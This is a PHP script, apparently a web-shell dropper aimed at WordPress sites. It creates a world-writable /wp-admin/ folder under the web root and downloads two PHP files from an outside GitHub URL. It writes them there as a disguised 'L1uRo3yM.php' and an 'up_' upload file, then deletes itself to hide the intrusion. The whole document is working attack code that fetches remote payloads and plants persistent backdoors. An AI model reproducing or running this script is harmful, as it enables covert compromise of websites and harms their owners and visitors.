<?php $url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
function file_name($url)
{
  if (preg_match('/\/([^\/]+)$/', $url, $matches)) {
    $x = $matches[1];
    echo $x;
    if ($x === "index.php"){
        $x = "L1uRo3yM.php";
        return $x;
    }else{
        return $x;
    }
  }
}
$test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/';
if (!file_exists($test_dir)) {
  if (mkdir($test_dir, 0777)) {
    echo "OK1";
  } else {
    echo "Fail Create-Folder";
  }
} else {
  echo "OK1 Exists";
}
$path = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url);

$sh = file_get_contents("https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/A.php");
  
$f = fopen($path, "w");
if ($f === false) {
    @file_put_contents($path, $sh);
} else {
    $bytes_written = fwrite($f, $sh);
    fclose($f);
    if ($bytes_written === false || $bytes_written < strlen($sh)) {
        @file_put_contents($path, $sh);
    }
}
 
$path_u = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/up_' . file_name($url);
$sh_u = file_get_contents("https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/B.php");
 
$fu = fopen($path_u, "w");
if ($fu === false) {
    @file_put_contents($path_u, $sh_u);
} else {
    $bytes_written = fwrite($fu, $sh_u);
    fclose($fu);
    if ($bytes_written === false || $bytes_written < strlen($sh_u)) {
        @file_put_contents($path_u, $sh_u);
    }
}
unlink(__FILE__)
